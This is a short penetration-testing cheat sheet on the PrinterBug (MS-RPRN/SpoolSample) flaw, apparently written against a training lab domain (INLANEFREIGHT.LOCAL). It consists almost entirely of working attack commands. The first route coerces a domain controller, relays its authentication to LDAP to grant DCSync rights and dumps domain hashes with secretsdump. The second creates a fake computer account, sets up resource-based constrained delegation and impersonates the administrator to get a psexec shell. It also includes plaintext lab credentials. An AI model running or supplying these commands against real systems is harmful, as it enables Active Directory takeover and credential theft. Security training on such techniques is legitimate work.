# PRINTER BUG (MS-RPRN / SpoolSample)
Vulnerability in the MS-RPRN protocol (Print System Remote Protocol) that allows forcing a Windows server to authenticate to any host we specify.

Check Vulnerability (PowerShell):
```
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
# Status = True → Vulnerable
```
Method 1: Relay to LDAP for DCSync
```
# Terminal 1 - Start ntlmrelayx
sudo ntlmrelayx.py -t ldap://172.16.5.5 --escalate-user forend -debug

# Terminal 2 - Force authentication
python3 spoolsample.py ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL 172.16.5.225
# Or with printerbug.py
python3 printerbug.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 172.16.5.225

# After success, forend can DCSync
secretsdump.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 -just-dc
```

Method 2: Relay for RBCD
```
# Step 1 - Create fake computer account
python3 addcomputer.py -computer-name 'FAKEPC$' -computer-pass 'FakePass123' -dc-host ACADEMY-EA-DC01 inlanefreight.local/forend:Klmcargo2

# Step 2 - Relay to configure RBCD
sudo ntlmrelayx.py -t ldap://172.16.5.5 --delegate-access --escalate-user FAKEPC$

# Step 3 - Force authentication
python3 spoolsample.py ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL 172.16.5.225

# Step 4 - Get ticket as administrator
getST.py -spn cifs/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL -impersonate administrator inlanefreight.local/FAKEPC\$:FakePass123
export KRB5CCNAME=administrator.ccache
psexec.py -k ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL -no-pass
```
